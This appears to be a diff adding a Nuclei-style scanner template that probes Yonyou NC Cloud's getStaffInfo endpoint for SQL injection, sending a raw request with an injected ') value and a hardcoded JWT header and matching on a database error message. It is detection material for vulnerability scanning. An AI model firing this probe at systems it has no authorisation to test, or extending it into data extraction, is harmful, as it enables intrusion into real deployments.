@@ -1,0 +1,58 @@
+id: poc-yaml-yongyou-nc-cloud-getstaffinfo-sqli
+
+info:
+  name: Yonyou NC Cloud getStaffInfo SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        GET /ncchr/attendstaff/getStaffInfo?id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+      - type: word
+        words:
+          - "获取人员信息失败"
+          - "yonyou.hrcloud"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+
+  - raw:
+      - |
+        GET /ncchr/attendstaff/getStaffInfo?id=1') HTTP/1.1
+        Host: {{Hostname}}
+        Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "SQL 命令未正确结束"
+          - "yonyou.hrcloud"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
